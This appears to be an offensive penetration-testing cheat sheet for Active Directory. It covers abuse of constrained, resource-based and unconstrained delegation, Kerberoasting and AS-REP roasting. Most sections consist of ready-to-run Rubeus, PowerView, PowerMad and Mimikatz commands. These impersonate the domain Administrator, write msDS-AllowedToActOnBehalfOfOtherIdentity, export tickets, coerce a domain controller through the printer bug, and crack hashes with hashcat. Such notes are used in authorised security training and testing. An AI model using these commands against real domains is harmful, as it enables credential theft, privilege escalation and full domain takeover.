## Constrained Delegation
### Summary
Constrained delegation can be set on the _frontend server_ (e.g. IIS) to allow it to delegate to _only selected backend services_ (e.g. MSSQL) on behalf of the user.

DACL UAC property: `TrustedToAuthForDelegation`. This allows `s4u2self`, i.e. requesting a TGS on behalf of _anyone_ to oneself, using just the NTLM password hash. This effectively allows the service to impersonate other users in the domain with just their hash, and is useful in situations where Kerberos isn’t used between the user and frontend.

DACL Property: `msDS-AllowedToDelegateTo`. This property contains the SPNs it is allowed to use `s4u2proxy` on, i.e. requesting a forwardable TGS for that server based on an existing TGS (e.g. the one gained from using `s4u2self`). This effectively defines the backend services that constrained delegation is allowed for.

**NOTE:** These properties do NOT have to exist together! If `s4u2proxy` is allowed without `s4u2self`, user interaction is required to get a valid TGS to the frontend service from a user, similar to unconstrained delegation.

#### Exploitation

In this case, we use Rubeus to automatically request a TGT and then a TGS with the `ldap` SPN to allow us to DCSync using a machine account.

```powershell
# Get a TGT using the compromised service account with delegation set (if needed)
.\Rubeus.exe asktgt /user:sa_with_delegation /domain:domain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

# Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt

# Same as above, but access the LDAP service on the DC (for dcsync) using pw hash
.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
```
### References
- [Agent on a Computer Configured For Constrained Delegation](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [User Account Configured For Constrained Delegation + A Known Plaintext](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [User Account Configured For Constrained Delegation + A Known NTLM Hash](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [Computer Account Configured For Constrained Delegation + A Known NTLM Hash](http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
***
## ACL Abuse
***
##  Resource Based Constrained Delegation
### Summary

Resource-Based Constrained Delegation (RBCD) configures the _backend server_ (e.g. MSSQL) to allow _only selected frontend services_ (e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.

DACL Property: `msDS-AllowedToActOnBehalfOfOtherIdentity`.

In this scenario, `s4u2self` and `s4u2proxy` are used as above to request a forwardable ticket on behalf of the user. However, with RBCD, the KDC checks if the SPN for the requesting service (i.e., the _frontend service_) is present in the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the _backend service_. This means that the _frontend service_ needs to have an SPN set. Thus, attacks against RBC have to be performed from either a service account with SPN or a machine account.

#### Exploitation

If we compromise a _frontend service_ that appears in the RBCD property of a _backend service_, exploitation is the same as with constrained delegation above. This is however not too common.

A more often-seen attack to RBCD is when we have `GenericWrite`, `GenericAll`, `WriteProperty`, or `WriteDACL` permissions to a computer object in the domain. This means we can write the `msDS-AllowedToActOnBehalfOfOtherIdentity` property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation above.

```powershell
# Create a new machine account using PowerMad
New-MachineAccount -MachineAccount InconspicuousMachineAccount -Password $(ConvertTo-SecureString 'Compromised123!' -AsPlainText -Force)

# Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target
$sid = Get-DomainComputer -Identity InconspicuousMachineAccount -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

# Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target
Get-DomainComputer -Identity TargetSrv01 | Set-DomainObject -Set @{'msdsallowedtoactonbehalfofotheridentity'=$SDBytes}

# Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target
.\Rubeus.exe s4u /user:InconspicuousMachineAccount$ /rc4:3644AC5E3D9441CCBCEF08CBAF98E910 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv01.corp1.com /ptt
```
### References
- Write privilege on computer object with msDSAllowedToActOnBehalfOfOTherIdentity ?
	- [Dfault policies for adding new computers present ?](https://decoder.cloud/2019/03/20/donkeys-guide-to-resource-based-constrained-delegation-from-standard-user-to-da/)
- LDAP Signing disabled ?
	- [Delegation Via Image Change](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
***
## Unconstrained Delegation
Can be set on a _frontend service_ (e.g., IIS web server) to allow it to delegate on behalf of the user to _any service in the domain_ (towards a _backend service_, such as an MSSQL database).

DACL UAC property: `TrustedForDelegation`.

#### Exploitation

With administrative privileges on a server with Unconstrained Delegation set, we can dump the TGTs for other users that have a connection. With Mimikatz:

```plaintext
sekurlsa::tickets /export
kerberos::ptt c:\path\to\ticket.kirbi
```

Or with Rubeus:

```powershell
.\Rubeus.exe klist
.\Rubeus.exe dump /luid:0x5379f2 /nowrap
.\Rubeus.exe ptt /ticket:doIFSDCC[...]
```

We can also gain the hash for a domain controller machine account, if that DC is vulnerable to the printer bug. On the server with Unconstrained Delegation, monitor for new tickets with Rubeus.

```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```

From attacking machine, entice the Domain Controller to connect using the printer bug. Binary from [here](https://github.com/leechristensen/SpoolSample).

```powershell
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

The TGT for the machine account of the DC should come in in the first session. We can pass this ticket to gain DCSync privileges.

```powershell
.\Rubeus.exe ptt /ticket:doIFxTCCBc...
```
***
## Exploits
- ZeroLogon
- SMBv1?
	- Eternal Blue
- [Has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege ?](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
	- PrintSpoofer
- Microsoft Exchange Proxylogon 

***

## ADIDNS
- Exploit ADIDNS by adding wildcard dns records via LDAP
	- [Has access to authenticated users?](https://blog.netspi.com/exploiting-adidns/)

***
 ## WSUS
- Push malicious updates

***
### Kerberoasting

#### Automatic

With PowerView:

```powershell
Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

Crack the hash with Hashcat:

```bash
hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```

#### Manual

```powershell
# Request TGS for kerberoastable account (SPN)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"

# Dump TGS to disk
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Crack with TGSRepCrack
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi
```

#### Targeted kerberoasting by setting SPN

We need ACL write permissions to set UserAccountControl flags for said user, see above for hunting. Using PowerView:

```powershell
Set-DomainObject -Identity support355user -Set @{serviceprincipalname='any/thing'}
```

### AS-REP roasting

Get the hash for a roastable user (see above for hunting). Using `ASREPRoast.ps1`:

```powershell
Get-ASREPHash -UserName VPN355user
```

Crack the hash with Hashcat:

```bash
hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule
```

#### Targeted AS-REP roasting by disabling Kerberos pre-authentication

We need ACL write permissions to set UserAccountControl flags for said user, see above for hunting. Uses PowerView.

```powershell
Set-DomainObject -Identity Control355User -XOR @{useraccountcontrol=4194304}
```